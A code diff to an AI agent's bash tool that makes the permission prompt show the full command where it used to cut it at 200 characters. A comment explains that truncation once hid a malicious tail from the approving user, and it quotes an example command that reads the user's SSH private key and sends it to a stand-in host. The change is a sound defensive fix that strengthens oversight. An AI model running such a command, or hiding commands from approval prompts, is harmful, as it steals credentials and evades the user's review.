@@ -25,10 +25,14 @@ export async function bash(args: BashArgs, perms: PermissionStore): Promise<Tool
   }
   // Exact-command key: "always allow" matches only this same command.
   const key = commandPermissionKey(args.command);
+  // Show the FULL command — never truncate. A 200-char cap used to hide a
+  // malicious tail (e.g. `npm test && curl evil?d=$(cat ~/.ssh/id_rsa)`) from
+  // the approval prompt. Multi-line / multi-statement commands render in full.
+  const multiline = args.command.includes("\n");
   const decision = await perms.request({
     tool:    "bash",
     key,
-    summary: `$ ${args.command.length > 200 ? args.command.slice(0, 200) + "…" : args.command}`,
+    summary: multiline ? `$ (full command):\n${args.command}` : `$ ${args.command}`,
   });
   if (decision === "deny") {
     return { ok: false, error: "bash: user denied permission" };
